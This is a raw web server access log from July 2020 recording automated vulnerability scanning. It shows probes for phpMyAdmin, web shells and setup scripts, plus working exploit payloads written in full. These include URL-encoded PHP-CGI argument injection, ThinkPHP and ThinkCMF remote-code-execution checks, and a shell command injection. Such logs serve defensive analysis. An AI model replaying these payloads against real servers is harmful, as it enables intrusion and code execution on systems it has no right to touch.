- - [27/Jul/2020:07:12:14 +0000] "GET / HTTP/1.1" 200 3970 "-" - "-"
- - [27/Jul/2020:07:12:16 +0000] "GET / HTTP/1.1" 200 2807 "-" - "Mozilla/5.0 zgrab/0.x"
- - [27/Jul/2020:09:16:08 +0000] "GET / HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
- - [27/Jul/2020:09:36:40 +0000] "GET / HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
- - [27/Jul/2020:13:03:54 +0000] "CONNECT github.com:443 HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
- - [27/Jul/2020:14:04:26 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
- - [27/Jul/2020:18:32:08 +0000] "GET / HTTP/1.0" 200 2406 "-" - "-"
- - [28/Jul/2020:00:22:44 +0000] "GET / HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
- - [28/Jul/2020:00:56:36 +0000] "GET / HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [28/Jul/2020:00:56:36 +0000] "GET /robots.txt HTTP/1.1" 200 437 "-" - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [28/Jul/2020:00:56:36 +0000] "POST /Admina43428a0/Login.php HTTP/1.1" 404 1871 "-" - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [28/Jul/2020:00:56:40 +0000] "GET / HTTP/1.1" 200 1309 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0)"
- - [28/Jul/2020:00:56:40 +0000] "GET /l.php HTTP/1.1" 404 1871 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0)"
- - [28/Jul/2020:00:56:44 +0000] "GET /test.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0)"
- - [28/Jul/2020:00:56:44 +0000] "POST /index.php HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:31.0) Gecko/20100101 Firefox/31.0"
- - [28/Jul/2020:00:56:45 +0000] "POST /bbs.php HTTP/1.1" 404 1871 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:31.0) Gecko/20100101 Firefox/31.0"
- - [28/Jul/2020:00:56:48 +0000] "POST /forum.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:31.0) Gecko/20100101 Firefox/31.0"
- - [28/Jul/2020:00:56:48 +0000] "POST /forums.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:31.0) Gecko/20100101 Firefox/31.0"
- - [28/Jul/2020:00:56:52 +0000] "POST /bbs/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:31.0) Gecko/20100101 Firefox/31.0"
- - [28/Jul/2020:00:56:52 +0000] "POST /forum/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:31.0) Gecko/20100101 Firefox/31.0"
- - [28/Jul/2020:00:56:56 +0000] "POST /forums/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:31.0) Gecko/20100101 Firefox/31.0"
- - [28/Jul/2020:00:56:56 +0000] "POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0"
- - [28/Jul/2020:00:57:00 +0000] "POST /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0"
- - [28/Jul/2020:00:57:00 +0000] "POST /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0"
- - [28/Jul/2020:00:57:04 +0000] "POST /cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0"
- - [28/Jul/2020:00:57:04 +0000] "POST /cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0"
- - [28/Jul/2020:00:57:05 +0000] "POST /%62%61%73%65/%70%6F%73%74%2E%70%68%70 HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
- - [28/Jul/2020:00:57:05 +0000] "GET /webdav/ HTTP/1.1" 404 1835 "-" - "Mozilla/5.0"
- - [28/Jul/2020:00:57:08 +0000] "GET /help.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:08 +0000] "GET /java.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:09 +0000] "GET /_query.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:09 +0000] "GET /test.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:12 +0000] "GET /db_pma.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:12 +0000] "GET /logon.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:13 +0000] "GET /help-e.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:13 +0000] "GET /license.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:16 +0000] "GET /hell.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:16 +0000] "GET /pmd_online.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:17 +0000] "GET /x.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:17 +0000] "GET /shell.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:20 +0000] "GET /b.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:20 +0000] "GET /sane.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:21 +0000] "GET /desktop.ini.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:21 +0000] "GET /z.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:24 +0000] "GET /lala-dpr.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:24 +0000] "GET /wpc.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:25 +0000] "GET /wpo.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:25 +0000] "GET /t6nv.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:28 +0000] "GET /text.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:28 +0000] "GET /wp-config.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:29 +0000] "GET /muhstik.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:29 +0000] "GET /muhstik2.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:30 +0000] "GET /muhstiks.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:32 +0000] "GET /lol.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:32 +0000] "GET /uploader.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:33 +0000] "GET /cmd.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:33 +0000] "GET /cmv.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:34 +0000] "GET /cmdd.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:36 +0000] "GET /cmd.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:36 +0000] "GET /shell.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:37 +0000] "GET /appserv.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:37 +0000] "GET /scripts/setup.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:38 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:40 +0000] "GET /scripts/db___.init.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:40 +0000] "GET /phpmyadmin/scripts/db___.init.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:41 +0000] "GET /phpMyAdmin/scripts/db___.init.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:41 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:42 +0000] "GET /PMA/scripts/setup.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:44 +0000] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:44 +0000] "GET /pma/scripts/db___.init.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:45 +0000] "GET /PMA/scripts/db___.init.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:45 +0000] "GET /myadmin/scripts/db___.init.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:46 +0000] "GET /MyAdmin/scripts/db___.init.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:48 +0000] "GET /cacti/plugins/weathermap/editor.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:48 +0000] "GET /weathermap/editor.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:49 +0000] "GET /index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50 HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:49 +0000] "GET /elrekt.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50 HTTP/1.1" 404 1871 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:50 +0000] "GET /App/?content=die(md5(HelloThinkPHP)) HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:50 +0000] "GET /index.php/module/action/param1/${@die(md5(HelloThinkPHP))} HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:52 +0000] "GET /index.php?s=/module/action/param1/${@die(md5(HelloThinkPHP))} HTTP/1.1" 200 2442 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:52 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 2442 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:52 +0000] "GET / HTTP/1.1" 200 2442 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:52 +0000] "GET /joomla/ HTTP/1.1" 404 1871 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:53 +0000] "GET /Joomla/ HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:53 +0000] "GET /?a=echo%20-n%20HelloNginx%7Cmd5sum HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:54 +0000] "GET /d7.php HTTP/1.1" 404 1871 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:56 +0000] "GET /1x.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:56 +0000] "GET /home.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:57 +0000] "GET /undx.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:57 +0000] "GET /spider.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:57:58 +0000] "GET /payload.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:00 +0000] "GET /izom.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:00 +0000] "GET /composer.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:01 +0000] "GET /hue2.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:01 +0000] "GET /Drupal.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:02 +0000] "GET /lang.php?f=1 HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:04 +0000] "GET /payload.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:04 +0000] "GET /new_license.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:05 +0000] "GET /images/!.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:05 +0000] "GET /images/vuln.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:06 +0000] "GET /hd.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:08 +0000] "GET /images/attari.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:08 +0000] "GET /images/jsspwneed.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:09 +0000] "GET /images/stories/cmd.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:09 +0000] "GET /images/stories/filemga.php?ssp=RfVbHu HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:10 +0000] "GET /up.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:12 +0000] "GET /huoshan.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:12 +0000] "GET /yu.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:13 +0000] "GET /floaw.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:13 +0000] "GET /ftmabc.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:14 +0000] "GET /doudou.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:16 +0000] "GET /xiaoxia.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:16 +0000] "GET /yuyang.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:17 +0000] "GET /zz.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:17 +0000] "GET /coonig.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
